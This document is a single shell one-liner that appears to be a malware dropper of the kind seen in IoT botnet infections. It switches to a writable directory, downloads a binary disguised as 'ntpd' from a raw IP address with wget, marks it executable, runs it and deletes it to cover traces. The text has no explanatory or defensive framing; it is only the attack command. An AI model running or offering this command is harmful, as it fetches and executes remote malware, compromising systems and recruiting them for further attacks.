cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://153.92.127.222/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
